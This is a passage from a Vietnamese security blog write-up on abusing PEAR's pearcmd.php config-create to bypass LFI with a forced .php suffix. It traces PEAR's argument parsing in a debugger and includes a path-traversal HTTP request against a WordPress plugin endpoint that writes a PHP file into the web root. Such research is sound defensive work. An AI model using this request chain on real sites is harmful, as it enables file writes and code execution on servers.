    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>Trong bài viết của tác giả có đề cập đến payload liên quan đến <code>config-create</code>, được mô tả là dùng để tạo file cấu hình.</p>
<p><figure><a class="lightgallery" href="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/doc-config.png" title="Mô tả về config-create" data-thumbnail="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/doc-config.png" data-sub-html="<h2>doc-config</h2><p>Mô tả về config-create</p>"><img loading="lazy" src='/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/doc-config.png' alt="doc-config" height="387" width="608"></a><figcaption class="image-caption">Mô tả về config-create</figcaption>
  </figure></p>
<p>Khi tôi thử chạy lệnh trên CLI:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">root@e182501c47c4:/var/www/html# php /usr/local/lib/php/pearcmd.php config-create
</span></span><span class="line"><span class="cl">config-create: must have <span class="m">2</span> parameters, root path and filename to save as</span></span></code></pre></td></tr></table>
</div>
</div><p>Khi không truyền đủ tham số, chương trình báo lỗi và yêu cầu hai tham số bắt buộc:</p>
<ul>
<li><code>root path</code>: thư mục gốc mà PEAR dùng để cài đặt các package và tìm cấu hình.</li>
<li><code>filename</code>: đường dẫn tới file cấu hình sẽ được tạo ra.</li>
</ul>
<p>Thử chạy với tham số đầy đủ:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">root@e182501c47c4:/var/www/html# php /usr/local/lib/php/pearcmd.php config-create test_root_path test_filename.php
</span></span><span class="line"><span class="cl">Root directory must be an absolute path beginning with <span class="s2">&#34;/&#34;</span>, was: <span class="s2">&#34;test_root_path&#34;</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Ở đây PEAR yêu cầu <code>test_root_path</code> phải là đường dẫn tuyệt đối, tức là phải có dấu <code>/</code> ở đầu.</p>
<p>Khi chạy lại với đường dẫn hợp lệ:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">root@e182501c47c4:/var/www/html# php /usr/local/lib/php/pearcmd.php config-create /test_root_path test_filename.php</span></span></code></pre></td></tr></table>
</div>
</div><p>Kết quả trả về:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="hl"><span class="lnt"> 9
</span></span><span class="hl"><span class="lnt">10
</span></span><span class="hl"><span class="lnt">11
</span></span><span class="hl"><span class="lnt">12
</span></span><span class="hl"><span class="lnt">13
</span></span><span class="hl"><span class="lnt">14
</span></span><span class="lnt">15
</span><span class="hl"><span class="lnt">16
</span></span><span class="hl"><span class="lnt">17
</span></span><span class="lnt">18
</span><span class="hl"><span class="lnt">19
</span></span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="hl"><span class="lnt">28
</span></span><span class="hl"><span class="lnt">29
</span></span><span class="hl"><span class="lnt">30
</span></span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="hl"><span class="lnt">43
</span></span><span class="lnt">44
</span><span class="hl"><span class="lnt">45
</span></span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Configuration (channel pear.php.net):
</span></span><span class="line"><span class="cl">=====================================
</span></span><span class="line"><span class="cl">Auto-discover new Channels     auto_discover    &lt;not set&gt;
</span></span><span class="line"><span class="cl">Default Channel                default_channel  pear.php.net
</span></span><span class="line"><span class="cl">HTTP Proxy Server Address      http_proxy       &lt;not set&gt;
</span></span><span class="line"><span class="cl">PEAR server [DEPRECATED]       master_server    &lt;not set&gt;
</span></span><span class="line"><span class="cl">Default Channel Mirror         preferred_mirror &lt;not set&gt;
</span></span><span class="line"><span class="cl">Remote Configuration File      remote_config    &lt;not set&gt;
</span></span><span class="line hl"><span class="cl">PEAR executables directory     bin_dir          /test_root_path/pear
</span></span><span class="line hl"><span class="cl">PEAR documentation directory   doc_dir          /test_root_path/pear/docs
</span></span><span class="line hl"><span class="cl">PHP extension directory        ext_dir          /test_root_path/pear/ext
</span></span><span class="line hl"><span class="cl">PEAR directory                 php_dir          /test_root_path/pear/php
</span></span><span class="line hl"><span class="cl">PEAR Installer cache directory cache_dir        /test_root_path/pear/cache
</span></span><span class="line hl"><span class="cl">PEAR configuration file        cfg_dir          /test_root_path/pear/cfg
</span></span><span class="line"><span class="cl">directory
</span></span><span class="line hl"><span class="cl">PEAR data directory            data_dir         /test_root_path/pear/data
</span></span><span class="line hl"><span class="cl">PEAR Installer download        download_dir     /test_root_path/pear/download
</span></span><span class="line"><span class="cl">directory
</span></span><span class="line hl"><span class="cl">Systems manpage files          man_dir          /test_root_path/pear/man
</span></span><span class="line"><span class="cl">directory
</span></span><span class="line"><span class="cl">PEAR metadata directory        metadata_dir     &lt;not set&gt;
</span></span><span class="line"><span class="cl">PHP CLI/CGI binary             php_bin          &lt;not set&gt;
</span></span><span class="line"><span class="cl">php.ini location               php_ini          &lt;not set&gt;
</span></span><span class="line"><span class="cl">--program-prefix passed to     php_prefix       &lt;not set&gt;
</span></span><span class="line"><span class="cl">PHP&#39;s ./configure
</span></span><span class="line"><span class="cl">--program-suffix passed to     php_suffix       &lt;not set&gt;
</span></span><span class="line"><span class="cl">PHP&#39;s ./configure
</span></span><span class="line hl"><span class="cl">PEAR Installer temp directory  temp_dir         /test_root_path/pear/temp
</span></span><span class="line hl"><span class="cl">PEAR test directory            test_dir         /test_root_path/pear/tests
</span></span><span class="line hl"><span class="cl">PEAR www files directory       www_dir          /test_root_path/pear/www
</span></span><span class="line"><span class="cl">Cache TimeToLive               cache_ttl        &lt;not set&gt;
</span></span><span class="line"><span class="cl">Preferred Package State        preferred_state  &lt;not set&gt;
</span></span><span class="line"><span class="cl">Unix file mask                 umask            &lt;not set&gt;
</span></span><span class="line"><span class="cl">Debug Log Level                verbose          &lt;not set&gt;
</span></span><span class="line"><span class="cl">PEAR password (for             password         &lt;not set&gt;
</span></span><span class="line"><span class="cl">maintainers)
</span></span><span class="line"><span class="cl">Signature Handling Program     sig_bin          &lt;not set&gt;
</span></span><span class="line"><span class="cl">Signature Key Directory        sig_keydir       &lt;not set&gt;
</span></span><span class="line"><span class="cl">Signature Key Id               sig_keyid        &lt;not set&gt;
</span></span><span class="line"><span class="cl">Package Signature Type         sig_type         &lt;not set&gt;
</span></span><span class="line"><span class="cl">PEAR username (for             username         &lt;not set&gt;
</span></span><span class="line"><span class="cl">maintainers)
</span></span><span class="line hl"><span class="cl">User Configuration File        Filename         /var/www/html/test_filename.php
</span></span><span class="line"><span class="cl">System Configuration File      Filename         #no#system#config#
</span></span><span class="line hl"><span class="cl">Successfully created default configuration file &#34;/var/www/html/test_filename.php&#34;</span></span></code></pre></td></tr></table>
</div>
</div><p>Kết quả cho thấy các đường dẫn con cho từng loại dữ liệu được tự động sinh ra dưới <code>/test_root_path/pear</code>. Ở dòng cuối cùng:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">Successfully</span> <span class="n">created</span> <span class="n">default</span> <span class="n">configuration</span> <span class="n">file</span> <span class="s2">&#34;/var/www/html/test_filename.php&#34;</span></span></span></code></pre></td></tr></table>
</div>
</div><p>File cấu hình được tạo trong thư mục hiện hành, không nằm trong <code>root_path</code>. Đây là hành vi mặc định của PEAR: <code>root_path</code> chỉ ảnh hưởng đến cấu trúc thư mục cài đặt, không quyết định vị trí lưu file cấu hình.</p>
<p>Khi truy cập file <code>&quot;/var/www/html/test_filename.php&quot;</code> trên trình duyệt:</p>
<p><figure><a class="lightgallery" href="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/file-create.png" title="Nội dung của test_filename.php được render trên trình duyệt" data-thumbnail="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/file-create.png" data-sub-html="<h2>file-create</h2><p>Nội dung của test_filename.php được render trên trình duyệt</p>"><img loading="lazy" src='/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/file-create.png' alt="file-create" height="137" width="1919"></a><figcaption class="image-caption">Nội dung của test_filename.php được render trên trình duyệt</figcaption>
  </figure></p>
<p>File được tạo có chứa thông tin về <code>test_root_path</code>, được trình bày ở dạng <code>serialize</code></p>
<p>Tuy nhiên, đó mới chỉ là quá trình thực thi trên CLI. Trong trường hợp khai thác qua web, cần phân tích mã nguồn để xem cách chương trình tiếp nhận và xử lý các tham số được truyền vào.</p>
<h2 class="heading-element" id="pearcmd-code-analysis"><span><code>pearcmd</code> Code Analysis</span>
  <a href="#pearcmd-code-analysis" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>Trước khi phân tích mã nguồn của <code>/usr/local/lib/php/pearcmd.php</code>, cần thiết lập môi trường debug để nắm rõ luồng thực thi - tham khảo: <a href="https://w41bu1.github.io/2025-10-22-wordpress-local-and-debugging-docker/"target="_blank" rel="external nofollow noopener noreferrer">https://w41bu1.github.io/2025-10-22-wordpress-local-and-debugging-docker/</a></p>
<p>Sau đó hãy copy toàn bộ mã nguồn <strong>php</strong> từ container về máy thật, giữ nguyên cấu trúc thư mục, để khi debugger dừng tại <code>/usr/local/lib/php/pearcmd.php</code> bạn vẫn có thể mở và theo dõi file tương ứng với container:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo docker cp wordpress:/usr/local/lib/php/ /usr/local/lib/php/</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight" title="/usr/local/lib/php/pearcmd.php"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">require_once</span> <span class="s1">&#39;PEAR.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">require_once</span> <span class="s1">&#39;PEAR/Frontend.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">require_once</span> <span class="s1">&#39;PEAR/Config.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">require_once</span> <span class="s1">&#39;PEAR/Command.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">require_once</span> <span class="s1">&#39;Console/Getopt.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$all_commands</span> <span class="o">=</span> <span class="nx">PEAR_Command</span><span class="o">::</span><span class="na">getCommands</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="nv">$argv</span> <span class="o">=</span> <span class="nx">Console_Getopt</span><span class="o">::</span><span class="na">readPHPArgv</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="nv">$options</span> <span class="o">=</span> <span class="nx">Console_Getopt</span><span class="o">::</span><span class="na">getopt2</span><span class="p">(</span><span class="nv">$argv</span><span class="p">,</span> <span class="s2">&#34;c:C:d:D:Gh?sSqu:vV&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">array_shift</span><span class="p">(</span><span class="nv">$argv</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="nv">$command</span> <span class="o">=</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$options</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">]))</span> <span class="o">?</span> <span class="nv">$options</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">:</span> <span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$fetype</span> <span class="o">==</span> <span class="s1">&#39;Gtk2&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">do</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="o">...</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$cmd</span> <span class="o">=</span> <span class="nx">PEAR_Command</span><span class="o">::</span><span class="na">factory</span><span class="p">(</span><span class="nv">$command</span><span class="p">,</span> <span class="nv">$config</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">...</span>
</span></span><span class="line"><span class="cl">        <span class="k">list</span><span class="p">(</span><span class="nv">$tmpopt</span><span class="p">,</span> <span class="nv">$params</span><span class="p">)</span> <span class="o">=</span> <span class="nv">$tmp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">...</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$ok</span> <span class="o">=</span> <span class="nv">$cmd</span><span class="o">-&gt;</span><span class="na">run</span><span class="p">(</span><span class="nv">$command</span><span class="p">,</span> <span class="nv">$opts</span><span class="p">,</span> <span class="nv">$params</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$ok</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">PEAR</span><span class="o">::</span><span class="na">raiseError</span><span class="p">(</span><span class="s2">&#34;unknown command `</span><span class="si">$command</span><span class="s2">&#39;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">...</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="k">false</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Đầu tiên, tất cả các command sẽ được load vào <code>$all_commands</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$all_commands</span> <span class="o">=</span> <span class="nx">PEAR_Command</span><span class="o">::</span><span class="na">getCommands</span><span class="p">();</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight" title="/usr/local/lib/php/PEAR/Command.php"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">getCommands</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;_PEAR_Command_commandlist&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">PEAR_Command</span><span class="o">::</span><span class="na">registerCommands</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;_PEAR_Command_commandlist&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p><code>getCommands()</code> gọi đến <code>registerCommands()</code> để đăng ký các command.</p>
<p><figure><a class="lightgallery" href="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/all_commands.png" title="Tất cả các command được load vào `$all_commands`" data-thumbnail="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/all_commands.png" data-sub-html="<h2>all_commands</h2><p>Tất cả các command được load vào `$all_commands`</p>"><img loading="lazy" src='/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/all_commands.png' alt="all_commands" height="390" width="362"></a><figcaption class="image-caption">Tất cả các command được load vào `$all_commands`</figcaption>
  </figure></p>
<p>Sau đó <code>$argv</code> được khởi tạo</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$argv</span> <span class="o">=</span> <span class="nx">Console_Getopt</span><span class="o">::</span><span class="na">readPHPArgv</span><span class="p">();</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight" title="php/Console/Getopt.php"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="hl"><span class="lnt"> 4
</span></span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="hl"><span class="lnt">12
</span></span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">readPHPArgv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="nv">$argv</span><span class="p">;</span>
</span></span><span class="line hl"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$argv</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!@</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;argv&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="o">!@</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;HTTP_SERVER_VARS&#39;</span><span class="p">][</span><span class="s1">&#39;argv&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">&#34;Could not read cmd args (register_argc_argv=Off?)&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="nx">PEAR</span><span class="o">::</span><span class="na">raiseError</span><span class="p">(</span><span class="s2">&#34;Console_Getopt: &#34;</span> <span class="o">.</span> <span class="nv">$msg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;HTTP_SERVER_VARS&#39;</span><span class="p">][</span><span class="s1">&#39;argv&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line hl"><span class="cl">        <span class="k">return</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;argv&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$argv</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Nếu <code>$argv</code> không phải mảng (tức là không có dữ liệu hợp lệ), hàm sẽ cố gắng tìm giá trị tương đương ở <code>$_SERVER['argv']</code> và trả về, tức các <code>search-word</code> đường ta truyền trong URL. ví dụ:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/wp-admin/admin-ajax.php?action=geo_mashup_query&amp;object_ids=2&amp;template=../../../../../../../usr/local/lib/php/pearcmd&amp;+config-create+/test_root_path+test_filename.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Quan sát trong debugger:</p>
<p><figure><a class="lightgallery" href="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv1.png" title="Giá trị của `$argv` trong debugger" data-thumbnail="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv1.png" data-sub-html="<h2>argv1</h2><p>Giá trị của `$argv` trong debugger</p>"><img loading="lazy" src='/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv1.png' alt="argv1" height="156" width="1634"></a><figcaption class="image-caption">Giá trị của `$argv` trong debugger</figcaption>
  </figure></p>
<p>Ngay sau đó <code>$argv</code> sẽ được loại bỏ phần tử thứ nhất rồi trở thành đối số của <code>Console_Getopt::getopt2()</code>, gía trị trả về gán cho <code>$options</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">array_shift</span><span class="p">(</span><span class="nv">$argv</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$options</span> <span class="o">=</span> <span class="nx">Console_Getopt</span><span class="o">::</span><span class="na">getopt2</span><span class="p">(</span><span class="nv">$argv</span><span class="p">,</span> <span class="s2">&#34;c:C:d:D:Gh?sSqu:vV&#34;</span><span class="p">);</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Giá trị bây giờ là:</p>
<p><figure><a class="lightgallery" href="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv_options.png" title="Giá trị của `$argv` và `$options` trong debugger" data-thumbnail="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv_options.png" data-sub-html="<h2>argv_options</h2><p>Giá trị của `$argv` và `$options` trong debugger</p>"><img loading="lazy" src='/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv_options.png' alt="argv_options" height="244" width="1634"></a><figcaption class="image-caption">Giá trị của `$argv` và `$options` trong debugger</figcaption>
  </figure></p>
<p>Biến <code>$command</code> được khởi tạo với giá trị <code>$options[1][0]</code> tức <code>config-create</code> trong trường hợp này.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$command</span> <span class="o">=</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$options</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">]))</span> <span class="o">?</span> <span class="nv">$options</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">:</span> <span class="k">null</span><span class="p">;</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Sau đó 1 <code>factory</code> được tạo và gán vào <code>$cmd</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$cmd</span> <span class="o">=</span> <span class="nx">PEAR_Command</span><span class="o">::</span><span class="na">factory</span><span class="p">(</span><span class="nv">$command</span><span class="p">,</span> <span class="nv">$config</span><span class="p">);</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Khi hover vào <code>$cmd</code> ta thấy được các tham số yêu cầu của lệnh <code>config-create</code></p>
<p><figure><a class="lightgallery" href="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/doc.png" title="Các tham số yêu cầu của lệnh `config-create`" data-thumbnail="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/doc.png" data-sub-html="<h2>doc</h2><p>Các tham số yêu cầu của lệnh `config-create`</p>"><img loading="lazy" src='/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/doc.png' alt="doc" height="424" width="861"></a><figcaption class="image-caption">Các tham số yêu cầu của lệnh `config-create`</figcaption>
  </figure></p>
<p>Và đặc biệt, ta thấy hàm thực thi cho <code>config-create</code> là <code>doConfigCreate</code></p>
<div class="highlight" title="/usr/local/lib/php/PEAR/Command.php"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
